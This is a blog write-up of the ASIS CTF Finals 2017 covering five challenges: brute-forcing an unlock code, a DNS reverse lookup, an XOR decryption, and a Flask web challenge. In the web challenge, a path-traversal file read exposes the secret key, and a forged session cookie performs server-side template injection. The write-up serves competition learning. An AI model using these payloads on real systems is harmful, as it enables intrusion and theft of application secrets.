---
layout: post
title: ASIS CTF Finals 2017 Write Up
date: 2017-09-10
categories:
  - ctf
  - write-ups
tags:
  - asis
  - flask
  - xor
  - crypto
---
I took part in the ASIS CTF finals this year with some members of Manchester Grey Hats. We managed to complete five of the challenges in total, which ranked us in 98th place out of 590 teams overall, and the highest ranked team in the UK.

<hr>

# Challenge: V.I.R
## Description
Rules are always broken, but not this time!

## Categories
Warm-up

## Solver(s)
[@Odin_The_Mighty](https://twitter.com/Odin_The_Mighty)

## Solution
The flag for this challenge was simply a case of heading over to the rules page, and finding it.

**Flag:** `ASIS{_rUL35_4r3_4Lw4y5_ImP0rt4nt}`

<hr>

# Challenge: Unlock Me
## Description
Find my lock, After finding the lock phrase, send ASIS{lock}

## Categories
Reverse

## Solver(s)
[@iamrastating](https://twitter.com/iamrastating)

## Solution
The program takes an input of 10 numbers in the range of 1 to 5. If any of the numbers fell outside this range, the program would exit immediately. If all 10 numbers had been specified, but one of them was incorrect, the message "Not quite" would be written to stdout and the program would exit.

As there was a relatively small number of permutations to go through in the worst case scenario, I wrote a script to generate and iterate through all possible permutations, launch the program on each iteration, feeding the numbers through and then checking stdout for the result.

In order to quicken things up, the script accepted the most significant bit of the number as an argument, so I could run 5 copies of the script in parallel:

```python
from subprocess import Popen, PIPE
import itertools
import sys

for c in itertools.product(['1','2','3', '4', '5'], repeat = 9):
    print c
    p = Popen('./unlock_me', stdin=PIPE, stdout=PIPE)

    p.stdin.write("%s\n" % sys.argv[1])
    p.stdin.write(c[0] + "\n")
    p.stdin.write(c[1] + "\n")
    p.stdin.write(c[2] + "\n")
    p.stdin.write(c[3] + "\n")
    p.stdin.write(c[4] + "\n")
    p.stdin.write(c[5] + "\n")
    p.stdin.write(c[6] + "\n")
    p.stdin.write(c[7] + "\n")
    p.stdin.write(c[8] + "\n")

    o = p.stdout.readline()
    o = p.stdout.readline()
    if o != 'Not quite\n':
        print 'FOUND IT'
        break

    print o
```

After around 20-30 minutes, one of the processes identified the flag, which when manually tested successfully worked:

```shell_session
rastating:~$ ./unlock_me
Enter the unlock code, 10 numbers in the range 1-5
2
1
3
1
4
4
1
1
5
4
Congrats!! Flag: ASIS{the_unlock_code_here}
```

**Flag:** `ASIS{2131441154}`

<hr>

# Challenge: Dig Dug
## Description
The pot calling the kettle black.

## Categories
Web, Warm-up

## Solver(s)
[@Odin_The_Mighty](https://twitter.com/Odin_The_Mighty)
[@iamrastating](https://twitter.com/iamrastating)

## Solution
Using `dig` to do a reverse lookup, it was possible to reveal another domain hosted on the same address:

```shell_session
rastating:~$ dig any -x 192.81.223.250

; <<>> DiG 9.10.3-P4-Ubuntu <<>> any -x 192.81.223.250
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 15317
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 512
;; QUESTION SECTION:
;250.223.81.192.in-addr.arpa.	IN	ANY

;; ANSWER SECTION:
250.223.81.192.in-addr.arpa. 1799 IN	PTR	airplane.asisctf.com.

;; Query time: 344 msec
;; SERVER: 127.0.1.1#53(127.0.1.1)
;; WHEN: Sat Sep 09 17:51:39 BST 2017
;; MSG SIZE  rcvd: 90
```

Navigating to `airplane.asisctf.com` led to a page which indicates that the flag can be obtained by going offline. Console output showed the events that could be manually invoked to do this, or it could be achieved by simply putting the browser into offline mode (i.e. File > Work Offline, in FireFox); doing so, revealed the flag.

**Flag:** `ASIS{_just_Go_Offline_When_you_want_to_be_creative_!}`

<hr>

# Challenge: Simple Crypto
## Description
Beginning always needs an interesting challenge, we can assure you, this challenge is an interesting one to begin the CTF!

## Categories
Crypto, Warm-up

## Solver(s)
[@iamrastating](https://twitter.com/iamrastating)

## Solution
The challenge provided an archive which consisted of an encrypted file [`flag.enc`] and the script used to encrypt it [`simple.py`]; which was:

```python
#!/usr/bin/python

import random
from secret import FLAG

KEY = 'musZTXmxV58UdwiKt8Tp'

def xor_str(x, y):
    if len(x) > len(y):
        return ''.join([chr(ord(z) ^ ord(p)) for (z, p) in zip(x[:len(y)], y)])
    else:
        return ''.join([chr(ord(z) ^ ord(p)) for (z, p) in zip(x, y[:len(x)])])

flag, key = FLAG.encode('hex'), KEY.encode('hex')
enc = xor_str(key * (len(flag) // len(key) + 1), flag).encode('hex')

ef = open('flag.enc', 'w')
ef.write(enc.decode('hex'))
ef.close()
```

As this is XOR encryption, and we have the key, reversing it was simple, as the reverse of XOR is XOR itself.

To do this, we read the encrypted flag back in, and pushed it through the same process that it came out of, using the script below:

```python
import random

KEY = 'musZTXmxV58UdwiKt8Tp'

def xor_str(x, y):
    if len(x) > len(y):
        return ''.join([chr(ord(z) ^ ord(p)) for (z, p) in zip(x[:len(y)], y)])
    else:
        return ''.join([chr(ord(z) ^ ord(p)) for (z, p) in zip(x, y[:len(x)])])

flag = ''
with open('flag.enc', 'r') as f:
    flag = f.read()
    f.close()

key = KEY.encode('hex')
enc = xor_str(key * (len(flag) // len(key) + 1), flag)

print(enc.decode('hex'))
```

Examining the output of the decrypted data revealed the keyword `PNG` towards the start of the content. Opening the file as an image then revealed the final flag.

**Flag:** `ASIS{juSt_S!mpl3_Cryp7o_f0r_perFect_guy5_l1ke_You!}`

<hr>

# Challenge: Golem is stupid!
## Description
Golem is an animated anthropomorphic being that is magically created entirely from inanimate matter, but Golem is stupid!

## Categories
Web

## Solver(s)
[@Odin_The_Mighty](https://twitter.com/Odin_The_Mighty)
[@iamrastating](https://twitter.com/iamrastating)
[@JayHarris_Sec](https://twitter.com/JayHarris_Sec)

## Solution
After submitting the form that is initially presented, we were taken to a page which contained a LFI in the query string parameter, `name`.

After a **lot** of fumbling around, we were able to find the command and arguments that were used to launch the web application on the server, by accessing `https://golem.asisctf.com/article?name=../../../../../../%2fproc%2fself%2fcmdline`; which was:

```
/usr/bin/uwsgi --ini /usr/share/uwsgi/conf/default.ini --ini /etc/uwsgi/apps-enabled/golem_proj.ini --daemonize /var/log/uwsgi/app/golem_proj.log
```

Now that we had a path to the configuration file for the Golem web app / project, we were able to access this using the same LFI, which then subsequently led to the main file of the web application itself, which was in `/opt/serverPython/golem/server.py`:

```python
#!/usr/bin/python
import os

from flask import (
	Flask,
	render_template,
	request,
    url_for,
	redirect,
	session,
	render_template_string
)
from flask.ext.session import Session

app = Flask(__name__)


execfile('flag.py')
execfile('key.py')

FLAG = flag
app.secret_key = key

@app.route("/golem", methods=["GET", "POST"])
def golem():
	if request.method != "POST":
		return redirect(url_for("index"))

	golem = request.form.get("golem") or None

	if golem is not None:
		golem = golem.replace(".", "").replace("_", "").replace("{","").replace("}","")

	if "golem" not in session or session['golem'] is None:
		session['golem'] = golem

	template = None

	if session['golem'] is not None:
		template = '''{ %% extends "layout.html" %%}
		{ %% block body %%}
		<h1>Golem Name</h1>
		<div class="row>
		<div class="col-md-6 col-md-offset-3 center">
		Hello : %s, why you don't look at our <a href='/article?name=article'>article</a>?
		</div>
		</div>
		{ %% endblock %%}
		''' % session['golem']

		print

		session['golem'] = None

	return render_template_string(template)

@app.route("/", methods=["GET"])
def index():
	return render_template("main.html")

@app.route('/article', methods=['GET'])
def article():

    error = 0

    if 'name' in request.args:
        page = request.args.get('name')
    else:
        page = 'article'

    if page.find('flag')>=0:
    	page = 'notallowed.txt'

    try:
        template = open('/home/golem/articles/{}'.format(page)).read()
    except Exception as e:
        template = e

    return render_template('article.html', template=template)

if __name__ == "__main__":
	app.run(host='0.0.0.0', debug=False)
```

This script led us to two other files:

* `flag.py`
* `key.py`

We were unable to directly access `flag.py` via the LFI, as it was filtering out any requests with the word "flag". However, we could access `key.py`, which revealed the secret key being used to sign session cookies: `7h15_5h0uld_b3_r34lly_53cur3d`.

With this key, and a small Python script I wrote, it was now possible to create and sign any custom cookie to be used in requests made to the Golem web application.

Within the `/golem` route, the Flask application creates a template from a string, but does not sanitise the session data that is injected directly into it. Meaning that it is possible to use the session cookie to inject arbitrary server side markup into the Jinja template.

As there was no context object being passed to the template renderer, the only things we had available to us were in the global scope (see http://flask.pocoo.org/docs/0.12/templating/).

However, as the flag was being stored in the global context, the previously created cookie signing script could be modified to inject the `config` object into the output, which would in turn lead to giving us the contents of the `FLAG` variable in the output:

```python
from flask import Flask, session, redirect, url_for, escape, request, render_template_string, render_template

app = Flask(__name__)

@app.route('/')
def index():
    session['golem'] = "{{ config }}"
    template = '{{ config }}'
    return render_template_string(template)

app.secret_key = '7h15_5h0uld_b3_r34lly_53cur3d'
```

Now, after running the script above, we could visit the local web app being served, grab the session cookie from it, and re-use that when making a POST request to the `/golem` route of the Golem web app, which outputs the below:

```
<Config {'JSON_AS_ASCII': True, 'USE_X_SENDFILE': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_NAME': 'session', 'SESSION_REFRESH_EACH_REQUEST': True, 'LOGGER_HANDLER_POLICY': 'always', 'LOGGER_NAME': 's', 'DEBUG': False, 'SECRET_KEY': '7h15_5h0uld_b3_r34lly_53cur3d', 'EXPLAIN_TEMPLATE_LOADING': False, 'MAX_CONTENT_LENGTH': None, 'APPLICATION_ROOT': None, 'SERVER_NAME': None, 'PREFERRED_URL_SCHEME': 'http', 'JSONIFY_PRETTYPRINT_REGULAR': True, 'TESTING': False, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'PROPAGATE_EXCEPTIONS': None, 'TEMPLATES_AUTO_RELOAD': None, 'TRAP_BAD_REQUEST_ERRORS': False, 'JSON_SORT_KEYS': True, 'JSONIFY_MIMETYPE': 'application/json', 'SESSION_COOKIE_HTTPONLY': True, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SESSION_COOKIE_SECURE': False, 'TRAP_HTTP_EXCEPTIONS': False}>
```

**Flag:** `ASIS{I_l0v3_SerV3r_S1d3_T3mplate_1nj3ct1on!!}`
